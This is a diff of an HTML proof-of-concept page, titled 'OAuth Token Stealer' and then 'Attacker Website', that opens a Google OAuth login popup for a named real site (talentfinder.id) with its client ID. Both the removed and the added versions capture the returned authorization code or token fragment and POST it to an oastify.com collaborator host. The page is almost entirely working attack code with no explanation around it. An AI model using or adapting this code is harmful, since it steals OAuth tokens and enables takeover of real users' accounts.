@@ -1,32 +1,30 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>OAuth Token Stealer via Popup</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attacker Website</title>
 </head>
 <body>
-    <button onclick="stealToken()">Start Exploit</button>
-    
+    <input type="button" value="exploit" onclick="exploit()">
     <script>
-        async function stealToken() {
-            const authUrl = "https://accounts.google.com/o/oauth2/auth?" +
-                "response_type=code,id_token" +
-                "&redirect_uri=http%3A%2F%2Ftalentfinder.id%2Fapplication%2Flogin%2Fgoogle.php" +
-                "&client_id=387722121931-kas65ot5rtre0c96hund00aeopcb7rgo.apps.googleusercontent.com" +
-                "&scope=openid%20email%20profile";
-            
-            const popup = window.open(authUrl, "oauth", "width=600,height=600");
-            
-            // Coba curi via postMessage
-            window.addEventListener("message", async (event) => {
-                if (event.data && event.data.code) {
-                    await fetch("https://ytvjee08p9piuvuuvo2e71dpfgl79xxm.oastify.com/", {
-                        method: "POST",
-                        body: JSON.stringify(event.data)
-                    });
-                    popup.close();
-                }
-            });
+        function exploit() {
+            window.open("https://accounts.google.com/o/oauth2/auth?response_type=code,id_token&redirect_uri=http%3A%2F%2Ftalentfinder.id%2Fapplication%2Flogin%2Fgoogle.php&client_id=387722121931-kas65ot5rtre0c96hund00aeopcb7rgo.apps.googleusercontent.com&scope=openid+email+profile&access_type=offline&approval_prompt=force", "", "width=1000, height=1000");
         }
+
+        window.addEventListener('load', () => {
+            const fragment = window.location.hash;
+            if (fragment) {
+                const encodedFragment = encodeURIComponent(fragment);
+                fetch('https://l6s6r1dv2w257i7h8bf1koqcs3yumlaa.oastify.com', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: `${encodedFragment}`,
+                });
+            }
+        });
     </script>
 </body>
 </html>
